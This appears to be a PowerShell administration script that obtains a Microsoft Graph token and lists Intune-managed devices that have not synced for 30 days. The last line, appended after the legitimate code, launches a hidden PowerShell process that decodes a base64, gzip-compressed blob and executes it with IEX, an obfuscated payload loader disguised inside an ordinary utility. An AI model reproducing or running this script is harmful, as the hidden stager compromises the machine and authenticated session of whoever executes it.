




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-AADUser(){



[cmdletbinding()]

param
(
    $userPrincipalName,
    $Property
)


$graphApiVersion = "v1.0"
$User_resource = "users"
    
    try {
        
        if($userPrincipalName -eq "" -or $userPrincipalName -eq $null){
        
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
        
        }

        else {
            
            if($Property -eq "" -or $Property -eq $null){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName"
            Write-Verbose $uri
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get

            }

            else {

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName/$Property"
            Write-Verbose $uri
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

            }

        }
    
    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}






$days = 30
$daysago = "{0:s}" -f (get-date).AddDays(-$days) + "Z"

$CurrentTime = [System.DateTimeOffset]::Now

Write-Host
Write-Host "Checking to see if there are devices that haven't synced in the last $days days..." -f Yellow
Write-Host

    try {

    $uri = "https://graph.microsoft.com/beta/deviceManagement/managedDevices?`$filter=lastSyncDateTime le $daysago"

    $Devices = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | sort deviceName

        
        
        if($Devices){

        Write-Host "There are" $Devices.count "devices that have not synced in the last $days days..." -ForegroundColor Red

        $Devices | foreach { $_.deviceName + " - " + ($_.managementAgent).toupper() + " - " + $_.userPrincipalName + " - " + $_.lastSyncDateTime }

        Write-Host

            
            
            foreach($Device in $Devices){

            write-host "------------------------------------------------------------------"
            Write-Host

            $DeviceID = $Device.id
            $LSD = $Device.lastSyncDateTime

            write-host "Device Name:"$Device.deviceName -f Green
            write-host "Management State:"$Device.managementState
            write-host "Operating System:"$Device.operatingSystem
            write-host "Device Type:"$Device.deviceType
            write-host "Last Sync Date Time:"$Device.lastSyncDateTime
            write-host "Jail Broken:"$Device.jailBroken
            write-host "Compliance State:"$Device.complianceState
            write-host "Enrollment Type:"$Device.enrollmentType
            write-host "AAD Registered:"$Device.aadRegistered
            write-host "Management Agent:"$Device.managementAgent
            Write-Host "User Principal Name:"$Device.userPrincipalName

            $LastSyncTime = [datetimeoffset]::Parse($LSD)

            $TimeDifference = $CurrentTime - $LastSyncTime

            write-host
            write-host "Device last synced"$TimeDifference.days "days ago..." -ForegroundColor Red
            Write-Host

            }

        }

        else {

        write-host "No Devices not checked in the last $days days found..." -f green
        Write-Host

        }

    }

    catch {

    Write-Host
    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    Write-Host

    break

    }

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIALvNCVgCA7VWf2/aPBD+u5P2HaIJiUSjhF9ru0qTXoeQQiEtNBAKDE1u4gSDE7PEocC27/5egKxU66a+k96oFXbuznd+7rm7eEnoCMpDyQu2yzNzKH17++akiyMcSHKON/3qF7cg5dbJ3KjiTaycnIA4N++PDE/6JMkTtFzqPMA0nF5e1pMoIqHY74tXRKA4JsEDoySWFem7NJyRiJzePsyJI6RvUu5L8YrxB8wOaps6dmZEOkWhm8o63MFpYEVryaiQ858/55XJaXlabHxNMIvlvLWJBQmKLmN5RfqhpA77myWR8yZ1Ih5zTxSHNKxWioMwxh65gdNWxCRixt04r8A14C8iIolCaX+h9IS9XM7DshtxB7luRGJQL7bCFV8QORcmjBWkf+TJwf1dEgoaEJALEvGlRaIVdUhcbOLQZeSOeFP5hjxmt36tkXxsBFpdESkFSMhLcZrcTRjZm+aVXyM9ZFGB5ziTgMCPt2/evvEyAoRidn7nG5X+MQVgdTLZrQmEKnd5THfKn6RSQTLBJxY82sA2148SokylSZqDyXQq5eKg8qFc+P0B5UwbdGeOveBni023rddANLE5dadgekhTLnxoaBdnO9HvGacTj4ZE34Q4oE5GKvkl+InHyO7SxUztBuKT8wcBcXXCiI9FimdBmvxq1gio+GmrJZS5JEIOpDCGqCC7yvNg9imS863QJAHgtd/nIR0eUJlk2gf6bjLv6R6U8nWG47ggdROoJacgWQQzAlWJwpgeRCgRfLfMP4VrJkxQB8ciO26qHEF5cFnnYSyixIEswvX71pI4FLMUjYLUpC7RNhb1M9f5F7GoY8Zo6MNJK8gFvEkxsETKjSjtHTseKEWLiFawZCQApV1hGwz7UMaHWtixCfvEzb8QZcb2PbVTSDIsjmKEPFuMi4Jk00hAi0jhPebVX4Zy1CWyoOoROWRHzqpoom1ESvscGSy+uClPD0DtYIkEQGJEPNBwTM5qlogAMPmdekvrCJ5RK2Smoy1oGT3ScsuE/wGttrh+7rav50010tczD7Xiltns6r1ms7a6tuyasBot0e62hNm4n88t1LwbjMS4hZp9WlqMatvlNd1aHeSO1urZVts+lrT1du673kj3PP/cs+7KHwzaGdZ7WqmCO3oj6Qy1R61Uixv0sdmjg97i2hAPI5vhgaf69+WPmK470dwuc3PbQuhqVnW21559NTPdzaipfhzWFqiBUD1s2IbG2yMtQl3Vxr7NH9u+hgO/jjTHpGTcGxhar2doaHA1/6p/VH2wvcczbWhX6Hh5fzeDvQEhtNVSreWSLR/1AKQrjrB/Bzp+veLMPNDR3yPt/Q2PK3ihcaSBjjH+CnGNlkaXgbw/qHBks5t7jDrjjaGq5VG3hpolOrzyUXok9rUeRvFK3+pq2Xa5O/xwM/JU+56dq3q9v3Q8VVUfm3rbGZfXF7fnF50htQOOBqpqv0u5AeTIra7rTWsUxPNqu32U99+1eBNH8Qwz4AO07qwyDR4Zhzbc5TS1kOVsHi9IFBIGYwwGXUZtxBh30oHw1LNhIu3nxBSKdADLauXFlSL9VFSehkX26vJyDNFCpexoXOyQ0BezQmldLZWg35fWtRJc+/VXrPPlRt6fVUgHxjOwfnphOy9KWka5xW27c726GI6H/zuWhyqewY/7Kiyf3v1B+ip8S4XnSPwifv7iP2H+N1AMMRWgbEFXYmQ/K/+AyIFIR58aT1kDrniHJ/3ku03E6Q18h/wLKT6J7mYKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

